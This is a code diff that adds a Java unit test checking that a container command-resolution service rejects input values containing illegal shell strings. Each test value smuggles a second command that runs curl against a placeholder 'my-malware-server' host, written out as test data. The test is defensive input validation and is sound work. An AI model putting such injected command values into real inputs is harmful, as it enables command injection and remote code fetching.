@@ -18,6 +18,7 @@ import org.mockito.Mockito;
 import org.nrg.config.services.ConfigService;
 import org.nrg.containers.config.IntegrationTestConfig;
 import org.nrg.containers.exceptions.CommandResolutionException;
+import org.nrg.containers.exceptions.IllegalInputException;
 import org.nrg.containers.model.command.auto.Command;
 import org.nrg.containers.model.command.auto.Command.CommandInput;
 import org.nrg.containers.model.command.auto.Command.CommandWrapper;
@@ -52,7 +53,9 @@ import java.util.Map;
 import java.util.Set;
 
 import static org.hamcrest.Matchers.hasEntry;
+import static org.hamcrest.Matchers.instanceOf;
 import static org.hamcrest.Matchers.is;
+import static org.hamcrest.Matchers.isA;
 import static org.hamcrest.Matchers.not;
 import static org.hamcrest.Matchers.nullValue;
 import static org.junit.Assert.assertThat;
@@ -512,6 +515,36 @@ public class CommandResolutionTest {
             fail("Command resolution should have failed with missing required parameters.");
         } catch (CommandResolutionException e) {
             assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
+        }
+    }
+
+    @Test
+    public void testIllegalArgs() throws Exception {
+        final String commandJsonFile = resourceDir + "/illegal-args-command.json";
+        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
+        final Command command = commandService.create(tempCommand);
+
+        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
+        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
+            commandWrappers.put(commandWrapper.name(), commandWrapper);
+        }
+
+        final CommandWrapper identityWrapper = commandWrappers.get("identity-wrapper");
+        final String inputName = "anything";
+
+        for (final String illegalString : CommandResolutionService.ILLEGAL_INPUT_STRINGS) {
+            final Map<String, String> runtimeValues = Maps.newHashMap();
+
+            // Ignore the fact that these aren't all valid shell commands. We are only checking for the presence of the substrings.
+            runtimeValues.put(inputName, "foo " + illegalString + " curl https://my-malware-server");
+
+            try {
+                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(identityWrapper.id(), runtimeValues, mockUser);
+                fail("Command resolution should have failed because of the illegal string.");
+            } catch (IllegalInputException e) {
+                assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
+                        inputName, illegalString)));
+            }
         }
     }
 }
